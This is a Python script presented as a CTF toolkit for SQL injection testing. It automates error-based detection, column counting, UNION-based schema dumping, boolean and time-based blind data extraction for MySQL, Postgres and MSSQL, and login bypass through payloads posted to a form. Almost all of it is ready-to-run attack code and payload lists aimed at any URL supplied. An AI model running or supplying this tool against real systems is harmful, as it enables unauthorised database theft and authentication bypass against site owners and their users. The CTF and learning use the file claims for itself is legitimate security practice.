#!/usr/bin/env python3
"""
SQL Injection Tester — CTF Toolkit
Covers: error-based, union-based, blind boolean, blind time-based
Usage: python3 sqli_tester.py
"""
import requests
import sys
import time
import string
import argparse
from urllib.parse import quote

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})

# ─── PAYLOADS ─────────────────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'", '"', "' --", '" --', "' #", "') --", '") --',
    "1'", "1\"", "1' OR '1'='1", "1' OR 1=1 --",
    "1 AND 1=2--", "' AND 1=2--",
    "' OR 'x'='x", "' OR 1=1#",
    "admin'--", "admin' #",
]

UNION_TEMPLATE = "' UNION SELECT {cols}--"
BLIND_BOOL_TEMPLATE   = "' AND (SELECT SUBSTRING({field},1,1) FROM {table} LIMIT 1)='{char}'--"
BLIND_TIME_TEMPLATE   = "'; IF(1=1) WAITFOR DELAY '0:0:{sec}'--"   # MSSQL
BLIND_TIME_MYSQL      = "' AND SLEEP({sec})--"
BLIND_TIME_POSTGRES   = "'; SELECT pg_sleep({sec});--"

SQLI_CHARS = string.printable.strip()


# ─── HELPERS ──────────────────────────────────────────────────────────────────

def check_error(url: str, param: str, payload: str) -> bool:
    keywords = ["sql", "syntax", "mysql", "ora-", "unclosed", "unterminated",
                "sqlite", "pg_", "warning", "error in your sql"]
    try:
        params = {param: payload}
        r = session.get(url, params=params, timeout=10)
        body = r.text.lower()
        return any(k in body for k in keywords)
    except Exception:
        return False


def get_column_count(url: str, param: str, base: str = "1") -> int:
    for n in range(1, 20):
        payload = f"{base}' ORDER BY {n}--"
        r = session.get(url, params={param: payload}, timeout=10)
        if "error" in r.text.lower() or r.status_code >= 500:
            return n - 1
    return 0


def union_dump(url: str, param: str, cols: int, col_idx: int = 1) -> str:
    nulls = ["NULL"] * cols
    nulls[col_idx - 1] = "GROUP_CONCAT(schema_name SEPARATOR ',')"
    payload = f"0' UNION SELECT {','.join(nulls)} FROM information_schema.schemata--"
    r = session.get(url, params={param: payload}, timeout=10)
    return r.text


def blind_bool_extract(url: str, param: str, query: str, max_len: int = 64) -> str:
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for char in SQLI_CHARS:
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))={ord(char)}--"
            r = session.get(url, params={param: payload}, timeout=10)
            if "true_indicator" in r.text or r.status_code == 200:  # adapt indicator
                result += char
                found = True
                break
        if not found:
            break
        print(f"\r[+] Extracted: {result}", end="", flush=True)
    print()
    return result


def blind_time_extract(url: str, param: str, query: str,
                       db: str = "mysql", max_len: int = 64) -> str:
    result = ""
    threshold = 3  # seconds
    for pos in range(1, max_len + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if db == "mysql":
                payload = (f"' AND IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid},"
                           f"SLEEP({threshold}),0)--")
            elif db == "postgres":
                payload = (f"' AND (SELECT CASE WHEN ASCII(SUBSTRING(({query}),{pos},1))>{mid} "
                           f"THEN pg_sleep({threshold}) ELSE pg_sleep(0) END)--")
            else:
                payload = (f"'; IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid}) "
                           f"WAITFOR DELAY '0:0:{threshold}'--")
            start = time.time()
            session.get(url, params={param: payload}, timeout=threshold + 5)
            elapsed = time.time() - start
            if elapsed >= threshold:
                lo = mid + 1
            else:
                hi = mid
        if lo == 32:
            break
        result += chr(lo)
        print(f"\r[+] Extracted: {result}", end="", flush=True)
    print()
    return result


# ─── AUTH BYPASS ──────────────────────────────────────────────────────────────

AUTH_BYPASS_PAYLOADS = [
    ("admin'--",   "anything"),
    ("admin' #",   "anything"),
    ("' OR 1=1--", "anything"),
    ("' OR '1'='1",  "' OR '1'='1"),
    ("admin'/*",   "anything"),
    ("' OR 1=1#",  "x"),
    ('") OR ("1"="1', 'x'),
]

def try_auth_bypass(url: str, user_field: str, pass_field: str) -> bool:
    for user, pwd in AUTH_BYPASS_PAYLOADS:
        r = session.post(url, data={user_field: user, pass_field: pwd}, timeout=10)
        if "logout" in r.text.lower() or "dashboard" in r.text.lower() or \
           "welcome" in r.text.lower() or r.url != url:
            print(f"[+] Auth bypass: user={repr(user)} pass={repr(pwd)}")
            return True
    return False


# ─── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="CTF SQL Injection Tester")
    parser.add_argument("--url",   required=True)
    parser.add_argument("--param", required=True, help="GET parameter to inject")
    parser.add_argument("--mode",  choices=["detect","union","blind-bool","blind-time","auth"],
                        default="detect")
    parser.add_argument("--cols",  type=int, default=0, help="Column count (for union)")
    parser.add_argument("--query", default="SELECT database()", help="SQL subquery to extract")
    parser.add_argument("--db",    choices=["mysql","postgres","mssql"], default="mysql")
    args = parser.parse_args()

    if args.mode == "detect":
        print("[*] Testing error-based payloads...")
        for p in ERROR_PAYLOADS:
            if check_error(args.url, args.param, p):
                print(f"[+] Potential SQLi with: {repr(p)}")
        print("[*] Counting columns via ORDER BY...")
        n = get_column_count(args.url, args.param)
        if n:
            print(f"[+] Column count: {n}")

    elif args.mode == "union":
        cols = args.cols or get_column_count(args.url, args.param)
        if not cols:
            print("[-] Could not determine column count")
            sys.exit(1)
        print(f"[*] UNION injection with {cols} columns")
        print(union_dump(args.url, args.param, cols))

    elif args.mode == "blind-bool":
        print(f"[*] Boolean blind extraction: {args.query}")
        result = blind_bool_extract(args.url, args.param, args.query)
        print(f"[+] Result: {result}")

    elif args.mode == "blind-time":
        print(f"[*] Time-based blind extraction: {args.query} ({args.db})")
        result = blind_time_extract(args.url, args.param, args.query, db=args.db)
        print(f"[+] Result: {result}")

    elif args.mode == "auth":
        user_field = input("Username field name: ")
        pass_field = input("Password field name: ")
        try_auth_bypass(args.url, user_field, pass_field)


if __name__ == "__main__":
    main()
